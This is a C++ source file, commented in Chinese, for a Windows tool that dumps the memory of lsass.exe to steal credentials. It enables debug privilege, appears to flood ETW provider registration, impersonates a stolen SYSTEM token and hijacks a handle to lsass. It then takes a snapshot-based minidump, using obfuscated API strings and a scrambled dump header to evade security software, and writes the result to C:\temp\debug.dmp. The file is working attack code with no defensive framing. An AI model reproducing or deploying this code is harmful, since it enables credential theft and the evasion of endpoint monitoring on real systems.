#include "includes.h"

#define WIN32_LEAN_AND_MEAN
#define IsProcessSnapshotCallback 16
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS 0x00000000
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
#define STATUS_ACCESS_DENIED 0xC0000022
NTADJUSYPRIVILEGESTOKEN NtAdjustPrivilegesToken;
NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;
NTOPENPROCESS NtOpenProcess;
NTDUPLICATEOBJECT NtDuplicateObject;
NTQUERYOBJECT NtQueryObject;
NTCLOSE NtClose;
NTDUPLICATETOKEN NtDuplicateToken;
NTSETINFORMATIONTHREAD NtSetInformationThread;
NTQUERYINFORMATIONTOKEN NtQueryInformationToken;
NTOPENPROCESSTOKEN NtOpenProcessToken;
SIZE_T DumpBufferSize = 130000000;
LPVOID DumpBuffer;
DWORD bytesRead = 0;

//回调函数
BOOL CALLBACK minidumpCallback(
	IN PVOID callbackParam,
	IN const PMINIDUMP_CALLBACK_INPUT callbackInput,
	IN OUT PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IsProcessSnapshotCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)DumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		if ((bytesRead <= DumpBufferSize) && (destination != NULL)) {
			RtlCopyMemory(destination, source, bufferSize);
		}
		else {
			callbackOutput->Status = S_FALSE;
		}

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return TRUE;
	}
	return TRUE;
}

//判断权限
BOOL System() {
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		if (hToken) CloseHandle(hToken);
		return FALSE;
	}

	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
		if (hToken) CloseHandle(hToken);
		return FALSE;
	}

	fIsElevated = elevation.TokenIsElevated;
}


//获取SeDebugPrivilege 权限
DWORD GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
		return 1;
	}
	return 0;
}

//
void E_T_W() {
	DWORD status = ERROR_SUCCESS;
	REGHANDLE RegistrationHandle = NULL;
	const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} };
	int count = 0;
	while (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {
		count++;
	}
	printf("%d\n", count);
}

//获取pid号
DWORD Logs(void)
{
	EVT_HANDLE hResults = NULL;
	EVT_HANDLE hContext = NULL;
	EVT_HANDLE hEvent = NULL;

	DWORD ProcessId = 0;
	do {

		hResults = EvtQuery(NULL, L"Security", L"*[System[EventID=4608]]", EvtQueryChannelPath | EvtQueryTolerateQueryErrors);
		if (!hResults) {
			wprintf(L"EvtQuery failed: %x\n", GetLastError());
			break;
		}

		if (!EvtSeek(hResults, 0, NULL, 0, EvtSeekRelativeToLast)) {
			wprintf(L"EvtSeek failed:%x\n", GetLastError());
			break;
		}

		DWORD dwReturned = 0;
		if (!EvtNext(hResults, 1, &hEvent, INFINITE, 0, &dwReturned) || dwReturned != 1) {
			wprintf(L"EvtNext failed:%x\n", GetLastError());
			break;
		}

		LPCWSTR ppValues[] = { L"Event/System/Execution/@ProcessID" };
		hContext = EvtCreateRenderContext(1, ppValues, EvtRenderContextValues);
		if (!hContext) {
			wprintf(L"EvtCreateRenderContext failed:%x\n", GetLastError());
			break;
		}

		EVT_VARIANT pProcessId = { 0 };
		if (!EvtRender(hContext, hEvent, EvtRenderEventValues, sizeof(EVT_VARIANT), &pProcessId, &dwReturned, NULL)) {
			wprintf(L"EvtRender failed:%x\n", GetLastError());
			break;
		}

		ProcessId = pProcessId.UInt32Val;
	} while (FALSE);

	if (hEvent) EvtClose(hEvent);
	if (hContext) EvtClose(hContext);
	if (hResults) EvtClose(hResults);

	return ProcessId;
}


void InitializeObjectAttributes(
	POBJECT_ATTRIBUTES p,
	PUNICODE_STRING n,
	ULONG a,
	HANDLE r,
	PVOID s
) {
	p->Length = sizeof(OBJECT_ATTRIBUTES);
	p->RootDirectory = r;
	p->Attributes = a;
	p->ObjectName = n;
	p->SecurityDescriptor = s;
	p->SecurityQualityOfService = nullptr;
}

PSYSTEM_PROCESS_INFORMATION GetSysProcInfo() {
	NTSTATUS status = STATUS_SUCCESS;
	PVOID buffer = nullptr;
	ULONG bufferSize = 0;


	status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer) free(buffer);
		buffer = malloc(bufferSize);
		if (!buffer) {
			return nullptr;
		}
		status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
	}

	if (!NT_SUCCESS(status)) {
		if (buffer) free(buffer);
		return nullptr;
	}

	return (PSYSTEM_PROCESS_INFORMATION)buffer;
}
BOOL GetPromoted(HANDLE hToken) {

	HANDLE hCurrent = NtCurrentThread();
	HANDLE hDuplicate = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

	SECURITY_QUALITY_OF_SERVICE Qos;
	Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	Qos.ImpersonationLevel = SecurityImpersonation;
	Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
	Qos.EffectiveOnly = FALSE;

	ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	ObjectAttributes.RootDirectory = NULL;
	ObjectAttributes.ObjectName = NULL;
	ObjectAttributes.Attributes = 0;
	ObjectAttributes.SecurityDescriptor = NULL;
	ObjectAttributes.SecurityQualityOfService = &Qos;


	status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &ObjectAttributes, FALSE, TokenImpersonation, &hDuplicate);

	status = NtSetInformationThread(hCurrent, ThreadImpersonationToken, &hDuplicate, sizeof(HANDLE));

	return NT_SUCCESS(status);
}
BOOL IsSystemProcess(HANDLE hToken) {
	BOOL isSystem = FALSE;
	NTSTATUS status = STATUS_SUCCESS;
	PTOKEN_USER pTokenUser = nullptr;
	ULONG pTokenUserSize = sizeof(PTOKEN_USER);
	pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);

	status = NtQueryInformationToken(hToken, TokenUser, pTokenUser, pTokenUserSize, &pTokenUserSize);

	while (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_INFO_LENGTH_MISMATCH) {
		if (pTokenUser) free(pTokenUser);
		pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);
		if (!pTokenUser) {
			return FALSE;
		}
		status = NtQueryInformationToken(hToken, TokenUser, pTokenUser, pTokenUserSize, &pTokenUserSize);
	}

	if (!NT_SUCCESS(status)) {
		if (pTokenUser) free(pTokenUser);
		return FALSE;
	}

	PSID pSystemSid;
	ConvertStringSidToSidW(L"S-1-5-18", &pSystemSid);
	isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
	free(pTokenUser);
	LocalFree(pSystemSid);

	return isSystem;
}

BOOL LetMeDoStuff(HANDLE hToken, LUID& luid, BOOL bLetMeDoTheThing) {
	NTSTATUS status = STATUS_SUCCESS;
	TOKEN_PRIVILEGES priv = { 0 };

	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = bLetMeDoTheThing ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

	status = NtAdjustPrivilegesToken(hToken, FALSE, &priv, 0, NULL, NULL);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}
	return TRUE;
}
HANDLE FindersKeepers(LUID& luid) {
	PSYSTEM_PROCESS_INFORMATION sysProcInfo = GetSysProcInfo();
	std::wstring blacklist[] = { L"winlogon.exe", L"csrss.exe", L"svchost.exe", L"lsass.exe", L"spoolsv.exe" , L"LsaIso.exe" };
	int blacklistSize = sizeof(blacklist) / sizeof(*blacklist);
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;
	HANDLE hToken = nullptr;
	HANDLE hDuplicate = nullptr;

	HANDLE hCurrent = nullptr;

	status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrent);
	if (!NT_SUCCESS(status))
		if (status == STATUS_ACCESS_DENIED) {
			sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
			return hCurrent;
		}

	LetMeDoStuff(hCurrent, luid, TRUE);

	NtClose(hCurrent);

	do {
		if (sysProcInfo->ImageName.Length) {
			BOOL isBlacklisted = std::find(blacklist, blacklist + blacklistSize, sysProcInfo->ImageName.Buffer) != blacklist + blacklistSize;
			if (!isBlacklisted) {
				CLIENT_ID clientId = { (HANDLE)sysProcInfo->UniqueProcessId, 0 };
				OBJECT_ATTRIBUTES objAttr;
				InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

				SECURITY_QUALITY_OF_SERVICE Qos;
				Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
				Qos.ImpersonationLevel = SecurityImpersonation;
				Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
				Qos.EffectiveOnly = FALSE;

				objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
				objAttr.RootDirectory = NULL;
				objAttr.ObjectName = NULL;
				objAttr.Attributes = 0;
				objAttr.SecurityDescriptor = NULL;
				objAttr.SecurityQualityOfService = &Qos;


				status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &objAttr, &clientId);
				if (!NT_SUCCESS(status))
					if (status == STATUS_ACCESS_DENIED) {
						sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
						continue;
					}

				status = NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
				if (!NT_SUCCESS(status))
					if (status == STATUS_ACCESS_DENIED) {
						sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
						continue;
					}

				if (IsSystemProcess(hToken)) {
					status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &objAttr, FALSE, TokenPrimary, &hDuplicate);
					if (!NT_SUCCESS(status))
						if (status == STATUS_ACCESS_DENIED) {
							sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
							continue;
						}

					NtClose(hProcess);
					NtClose(hToken);
					return hDuplicate;
				}
				else {
					NtClose(hProcess);
					NtClose(hToken);
				}
			}
		}

		sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
	} while (sysProcInfo->NextEntryOffset != 0);

	exit(status);
}
//句柄劫持

HANDLE HijackHandle(std::string procName) {
	std::wstring wsProcName = std::wstring(procName.begin(), procName.end());
	HANDLE hProcess = nullptr;
	HANDLE hDuplicate = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	int howManyOpenProcessCalls = 0;
	int howManyNonProcessHandles = 0;

	ULONG handleTableInformationSize = sizeof(PSYSTEM_HANDLE_INFORMATION);
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));
	if (!handleTableInformation) {
		std::cerr << "HeapAlloc 失败，无法为句柄表信息分配内存。" << std::endl;
		return nullptr;
	}

	status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, handleTableInformationSize, &handleTableInformationSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (handleTableInformation) HeapFree(GetProcessHeap(), 0, handleTableInformation);
		handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));
		if (!handleTableInformation) {
			std::cerr << "HeapAlloc 失败，无法为句柄表信息分配内存。" << std::endl;
			return nullptr;
		}
		status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, handleTableInformationSize, &handleTableInformationSize);
	}

	if (!NT_SUCCESS(status)) {
		if (handleTableInformation) HeapFree(GetProcessHeap(), 0, handleTableInformation);
		std::cerr << "NtQuerySystemInformation 失败，状态码: " << status << std::endl;
		return nullptr;
	}
	std::cout << "NtQuerySystemInformation 成功。" << std::endl;

	DWORD pid = Logs();

	for (int i = 0; i < handleTableInformation->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[i];

		if (!(handleInfo.UniqueProcessId == pid) || handleInfo.GrantedAccess < PROCESS_VM_READ)
			continue;

		OBJECT_ATTRIBUTES objAttr;
		CLIENT_ID clientId;

		InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
		clientId.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(handleInfo.UniqueProcessId));
		clientId.UniqueThread = 0;

		status = NtOpenProcess(&hProcess, PROCESS_DUP_HANDLE, &objAttr, &clientId);
		howManyOpenProcessCalls++;

		if (NT_SUCCESS(status) && hProcess != nullptr) {
			std::cout << "NtOpenProcess 成功，句柄索引: " << i << std::endl;
			status = NtDuplicateObject(hProcess, reinterpret_cast<HANDLE>(handleInfo.HandleValue), NtCurrentProcess(), &hDuplicate, PROCESS_ALL_ACCESS, 0, 0);

			if (NT_SUCCESS(status) && hDuplicate != nullptr) {
				std::cout << "NtDuplicateObject 成功，句柄索引: " << i << std::endl;
				POBJECT_TYPE_INFORMATION objTypeInfo = NULL;
				ULONG objTypeInfoSize = sizeof(POBJECT_TYPE_INFORMATION);

				objTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeInfoSize));
				if (!objTypeInfo) {
					std::cerr << "HeapAlloc 失败，无法为对象类型信息分配内存。" << std::endl;
					continue;
				}

				status = NtQueryObject(hDuplicate, ObjectTypeInformation, objTypeInfo, objTypeInfoSize, &objTypeInfoSize);

				while (status == STATUS_INFO_LENGTH_MISMATCH) {
					if (objTypeInfo) HeapFree(GetProcessHeap(), 0, objTypeInfo);
					objTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeInfoSize));
					if (!objTypeInfo) {
						std::cerr << "HeapAlloc 失败，无法调整大小以分配对象类型信息。" << std::endl;
						continue;
					}
					status = NtQueryObject(hDuplicate, ObjectTypeInformation, objTypeInfo, objTypeInfoSize, &objTypeInfoSize);
				}

				if (!NT_SUCCESS(status)) {
					std::cerr << "NtQueryObject 失败，句柄索引: " << i << ", 状态码: " << status << std::endl;
					if (objTypeInfo) HeapFree(GetProcessHeap(), 0, objTypeInfo);
					continue;
				}

				if (wcscmp(objTypeInfo->Name.Buffer, L"Process") == 0) {
					TCHAR buffer[MAX_PATH];
					DWORD bufferSize = MAX_PATH;

					if (QueryFullProcessImageName(hDuplicate, 0, buffer, &bufferSize)) {
						std::wstring processImagePath(buffer);
						if (processImagePath.rfind(wsProcName) != std::wstring::npos) {
							std::cout << "成功找到目标进程，返回句柄。" << std::endl;
							if (hProcess) NtClose(hProcess);
							return hDuplicate;
						}
					}
					else {
						std::cerr << "QueryFullProcessImageName 失败，错误码: " << GetLastError() << std::endl;
					}
				}
				else {
					std::cout << "句柄索引: " << i << " 不是 Process 类型。" << std::endl;
				}

				if (objTypeInfo) HeapFree(GetProcessHeap(), 0, objTypeInfo);
			}
			else {
				std::cerr << "NtDuplicateObject 失败，句柄索引: " << i << ", 状态码: " << status << std::endl;
				continue;
			}
		}
		else {
			std::cerr << "NtOpenProcess 失败，句柄索引: " << i << ", 状态码: " << status << std::endl;
			continue;
		}
	}

	if (hProcess) NtClose(hProcess);
	if (hDuplicate) NtClose(hDuplicate);
	std::cerr << "未能找到目标进程句柄，退出，状态码: " << status << std::endl;
	return nullptr;
}


//
constexpr unsigned int numRNG() {
	const char* timeStr = __TIME__;
	unsigned int hash = '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;

	for (int i = 0; timeStr[i] != '\0'; ++i)
		hash = 31 * hash + timeStr[i];
	return hash;
}

//DJB2 算法
constexpr unsigned long DJB2me(const char* str) {
	unsigned long hash = numRNG();
	while (int c = *str++) {
		hash = ((hash << 7) + hash) + c;
	}
	return hash;
}

//签名摧毁
VOID SignatureDestroy(LPVOID dumpBuffer) {
	std::srand(numRNG());
	unsigned char* pBuffer = static_cast<unsigned char*>(dumpBuffer);

	for (int i = 0; i < 8; ++i) {
		pBuffer[i] = static_cast<unsigned char>(std::rand() % 256);
	}
}

BOOL Dumplass(HANDLE hProcess)
{
	BOOL isDumped = FALSE;

	//dumpBufferSize = FindBufferSize(hProcess);
	DumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DumpBufferSize);


	const wchar_t lldplehgbd[] = { L'D', L'b', L'g', L'h', L'e', L'l', L'p', L'.', L'd', L'l', L'l', L'\0' };
	const char dwdm[] = { 'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', '\0' };

	typedef BOOL(WINAPI* fMiniDumpWriteDump)(
		HANDLE hProcess,
		DWORD ProcessId,
		HANDLE hFile,
		MINIDUMP_TYPE DumpType,
		PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
		PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		PMINIDUMP_CALLBACK_INFORMATION CallbackParam
		);

	fMiniDumpWriteDump miniDumpWriteDump = (fMiniDumpWriteDump)(GetProcAddress(LoadLibrary(lldplehgbd), dwdm));
	if (!miniDumpWriteDump) {
		std::cerr << "无法加载 MiniDumpWriteDump 函数，错误码: " << GetLastError() << std::endl;
		return FALSE;
	}
	std::cout << "MiniDumpWriteDump 函数加载成功" << std::endl;
	if (!miniDumpWriteDump) {
		std::cerr << "无法加载 MiniDumpWriteDump 函数" << std::endl;
		return FALSE;
	}
	std::cout << "转储缓冲区分配成功,大小: " << DumpBufferSize << " bytes" << std::endl;

	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = &minidumpCallback;
	CallbackInfo.CallbackParam = NULL;

	HANDLE hSnapshot = nullptr;
	PSS_CAPTURE_FLAGS flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
	std::cout << "捕获进程快照..." << std::endl;

	HRESULT hr = PssCaptureSnapshot(hProcess, flags, CONTEXT_ALL, (HPSS*)&hSnapshot);

	if (FAILED(hr)) {
		std::cerr << "PssCaptureSnapshot 失败，错误码: " << std::hex << hr << std::endl;
		return FALSE;
	}
	std::cout << "进程快照捕获成功" << std::endl;


	isDumped = miniDumpWriteDump(hSnapshot, 0, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);

	PssFreeSnapshot(NtCurrentProcess(), (HPSS)hSnapshot);

	if (isDumped) {
		std::cout << "迷你转储成功，开始修改签名..." << std::endl;
		SignatureDestroy(DumpBuffer);
		LPCWSTR filePath = L"C:\\temp\\debug.dmp";
		DWORD fileAttributes = GetFileAttributesW(L"C:\\temp");
		if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
			if (!CreateDirectoryW(L"C:\\temp", NULL)) {
				printf("Create C:\\temp first\n");
				return 1;
			}
		}
		HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			std::cerr << "创建文件失败: " << GetLastError() << std::endl;
			return FALSE;
		}
		DWORD bytesWritten = 0;
		BOOL writeSuccess = WriteFile(hFile, DumpBuffer, bytesRead, &bytesWritten, NULL);
		CloseHandle(hFile);
		if (writeSuccess) {
			std::cout << "转储写入成功: " << bytesWritten << " bytes" << std::endl;
		}
		else {
			std::cerr << "转储写入失败: " << GetLastError() << std::endl;
			return FALSE;
		}
		RtlSecureZeroMemory(DumpBuffer, DumpBufferSize);
		HeapFree(GetProcessHeap(), 0, DumpBuffer);

		wprintf(L"运行修复脚本` on %s\n", filePath);

	}
	else
		wprintf(L"Failed, %x", GetLastError());
	return isDumped;
}
int main()
{
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	NtAdjustPrivilegesToken = (NTADJUSYPRIVILEGESTOKEN)GetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
	NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	NtOpenProcess = (NTOPENPROCESS)GetProcAddress(hNtdll, "NtOpenProcess");
	NtDuplicateObject = (NTDUPLICATEOBJECT)GetProcAddress(hNtdll, "NtDuplicateObject");
	NtQueryObject = (NTQUERYOBJECT)GetProcAddress(hNtdll, "NtQueryObject");
	NtClose = (NTCLOSE)GetProcAddress(hNtdll, "NtClose");
	NtDuplicateToken = (NTDUPLICATETOKEN)GetProcAddress(hNtdll, "NtDuplicateToken");
	NtSetInformationThread = (NTSETINFORMATIONTHREAD)GetProcAddress(hNtdll, "NtSetInformationThread");
	NtQueryInformationToken = (NTQUERYINFORMATIONTOKEN)GetProcAddress(hNtdll, "NtQueryInformationToken");
	NtOpenProcessToken = (NTOPENPROCESSTOKEN)GetProcAddress(hNtdll, "NtOpenProcessToken");
	if (!System()) {
		printf("Not Admin");
		exit(11);
	}
	if (GetDebugPrivilege())
	{
		printf("获取SeDebugPrivilege权限成功!\n");
	}
	else
	{
		printf("获取SeDebugPrivilege权限失败!");
	}
	printf("PID: %i\n", GetProcessId(NtCurrentProcess()));
	E_T_W();
	LUID luid = { 0,0 };
	GetPromoted(FindersKeepers(luid));
	const char ls[] = { 'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e', '\0' };
	HANDLE hProcess = nullptr;
	hProcess = HijackHandle(ls);

	if (hProcess && hProcess != INVALID_HANDLE_VALUE) {

		std::cout << "成功获取有效句柄: " << hProcess << std::endl;
		//CloseHandle(hProcess);
	}
	else {
		std::cerr << "获取句柄失败，句柄值: " << std::dec << reinterpret_cast<std::uintptr_t>(hProcess) << std::endl;
	}

	Dumplass(hProcess);
}
